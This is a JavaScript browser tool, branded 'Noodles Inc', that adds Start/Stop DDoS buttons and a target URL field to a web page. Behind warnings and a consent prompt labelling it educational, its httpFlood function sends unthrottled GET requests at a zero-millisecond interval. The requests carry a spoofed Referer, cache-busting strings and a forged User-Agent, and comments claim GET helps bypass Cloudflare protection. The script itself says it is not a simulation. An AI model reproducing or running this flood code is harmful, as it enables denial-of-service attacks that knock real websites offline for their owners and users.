// Hacking Warning from Noodles Inc: Use responsibly. Unauthorized use is illegal.
// Noodles Inc is NOT responsible for your actions.
// Logging all actions for accountability.

console.warn("Noodles Inc: DDoS tool loaded. Use with extreme caution. Logging enabled.");

// Explicit user consent required
if (!confirm("Noodles Inc: WARNING! This DDoS tool is for educational purposes ONLY. Unauthorized use is illegal. Press OK to proceed with EXPLICIT consent. Pressing Cancel will close this site.")) {
    window.close();
}

// UI elements
const startButton = document.createElement('button');
startButton.textContent = 'Start DDoS';
startButton.style.backgroundColor = 'darkred';
startButton.style.color = 'white';
startButton.style.padding = '10px';
startButton.style.margin = '10px';
document.body.appendChild(startButton);

const stopButton = document.createElement('button');
stopButton.textContent = 'Stop DDoS';
stopButton.style.backgroundColor = 'darkgreen';
stopButton.style.color = 'white';
stopButton.style.padding = '10px';
stopButton.style.margin = '10px';
stopButton.disabled = true; // Initially disabled
document.body.appendChild(stopButton);

const targetUrlInput = document.createElement('input');
targetUrlInput.type = 'text';
targetUrlInput.placeholder = 'Enter target URL';
targetUrlInput.style.padding = '10px';
targetUrlInput.style.margin = '10px';
targetUrlInput.style.width = '300px';
document.body.appendChild(targetUrlInput);

const timerDisplay = document.createElement('div');
timerDisplay.textContent = 'DDoS Timer: 0 seconds';
timerDisplay.style.margin = '10px';
document.body.appendChild(timerDisplay);

// Educational Information
const infoDiv = document.createElement('div');
infoDiv.innerHTML = `
    <h2>DDoS Tool Information</h2>
    <p>This tool demonstrates how a Distributed Denial of Service (DDoS) attack works. It floods a target server with requests, potentially overwhelming it and making it unavailable.</p>
    <p><b>Important:</b> Using this tool without authorization is illegal and can have severe consequences.</p>
`;
infoDiv.style.margin = '10px';
document.body.appendChild(infoDiv);

let floodInterval;
let startTime;

function httpFlood(url) {
    // Generate a random string for cache busting and slightly obfuscated Referer header
    const randomString = Math.random().toString(36).substring(2, 15);
    const referer = `https://www.google.com/search?q=${randomString}`;

    fetch(url, {
        mode: 'no-cors', // Bypass CORS (may not always work, but helpful)
        method: 'GET', //GET request to bypass Cloudflare
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Referer': referer // Spoofed referer
        }
    }).then(response => {
        console.log('Noodles Inc: Request sent successfully.', response.status);
    }).catch(error => {
        console.error('Noodles Inc: Error sending request:', error);
    });
    console.log("Noodles Inc: DDoS attack sent to: " + url);  // Log to console
}


function startDDoS(targetUrl) {
    if (!targetUrl) {
        alert("Noodles Inc: Please enter a target URL.");
        return;
    }
    startButton.disabled = true;
    stopButton.disabled = false;
    startTime = new Date();
    floodInterval = setInterval(() => {
        httpFlood(targetUrl);
    }, 0); // Send requests as fast as possible (no rate limiting)
    updateTimer();
}

function stopDDoS() {
    clearInterval(floodInterval);
    startButton.disabled = false;
    stopButton.disabled = true;
}

function updateTimer() {
    setInterval(() => {
        if (startTime) {
            const elapsedTime = Math.floor((new Date() - startTime) / 1000);
            timerDisplay.textContent = `DDoS Timer: ${elapsedTime} seconds`;
        }
    }, 1000);
}

// Event listeners
startButton.addEventListener('click', () => {
    const targetUrl = targetUrlInput.value;
    startDDoS(targetUrl);
});

stopButton.addEventListener('click', stopDDoS);

console.log("Noodles Inc: HTTP Flood loaded. This is not a simulation. Use with caution.");